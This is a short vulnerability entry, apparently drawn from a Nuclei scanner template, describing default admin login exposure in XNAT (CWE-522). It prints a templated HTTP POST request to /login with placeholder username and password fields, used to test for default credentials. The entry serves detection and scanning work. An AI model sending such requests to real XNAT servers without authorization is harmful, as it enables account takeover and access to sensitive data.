# Vulnerability: XNAT - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`xnat-default-login.yaml`)

## Description
XNAT contains an admin default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_method=localdb&username={{username}}&password={{password}}&login=&XNAT_CSRF=
```

